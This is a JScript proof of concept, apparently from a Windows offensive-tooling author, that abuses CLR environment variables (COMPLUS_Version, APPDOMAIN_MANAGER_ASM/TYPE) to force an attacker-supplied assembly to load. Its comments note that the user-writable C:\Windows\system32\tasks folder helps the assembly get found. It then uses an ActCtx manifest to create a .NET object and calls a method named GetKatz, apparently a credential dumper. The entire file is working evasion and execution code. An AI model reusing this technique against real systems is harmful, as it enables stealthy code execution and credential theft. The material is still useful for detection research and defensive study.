new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'Tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'MyAppDomainManager';


var o = new ActiveXObject("System.Object"); // Trigger AppDomainManager Load

// Ideally, we create a DLL, drop it anywhere and load it like DynamicWrapper...

// Loads Assembly, but expects it in the C:\Windows\System32 for example for managed code...
// Good news, CLR tries to resolve in sub dir with name of app.  
// Since C:\Windows\system32\tasks is user writable... :) CLR finds and loads our assembly.

new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'C:\\Tools';
var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"><assemblyIdentity name="tasks" type="win32" version="0.0.0.0" /><description>Built with love by Casey Smith @subTee </description><clrClass   name="MyDLL.Operations"   clsid="{31D2B969-7608-426E-9D8E-A09FC9A5ACDC}"   progid="MyDLL.Operations"   runtimeVersion="v4.0.30319"   threadingModel="Both" /><file name="tasks.dll"> </file></assembly>';

var ax = new ActiveXObject("Microsoft.Windows.ActCtx");

ax.ManifestText = manifest;

var dwx = ax.CreateObject("MyDLL.Operations");
WScript.StdOut.WriteLine(dwx.getValue1("a"));
WScript.StdOut.WriteLine(dwx.getValue2());
dwx.getValue3();
dwx.GetKatz();


